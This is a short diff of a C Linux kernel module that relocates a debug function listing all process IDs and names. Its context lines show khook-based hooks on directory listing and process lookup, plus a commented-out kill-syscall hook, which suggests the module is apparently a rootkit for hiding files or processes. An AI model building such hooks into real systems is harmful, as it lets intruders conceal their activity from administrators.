@@ -16,6 +16,24 @@
 
 #define FLAG 0x80000000
 
+
+static int print_pid(void)
+{
+	struct task_struct * task, * p;
+	struct list_head * pos;
+	int count = 0;
+	printk("Hello World enter begin:\n");
+	task =& init_task;
+	list_for_each(pos, &task->tasks)
+	{
+		p = list_entry(pos, struct task_struct, tasks);
+		count++;
+		printk("%d---------->%s\n", p->pid, p->comm);
+	}
+	printk("the number of process is: %d\n", count);
+	return 0;
+}
+
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
@@ -95,22 +113,6 @@ struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 	return tsk;
 }
 
-static int print_pid(void)
-{
-	struct task_struct * task, * p;
-	struct list_head * pos;
-	int count = 0;
-	printk("Hello World enter begin:\n");
-	task =& init_task;
-	list_for_each(pos, &task->tasks)
-	{
-		p = list_entry(pos, struct task_struct, tasks);
-		count++;
-		printk("%d---------->%s\n", p->pid, p->comm);
-	}
-	printk("the number of process is: %d\n", count);
-	return 0;
-}
 
 /*
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
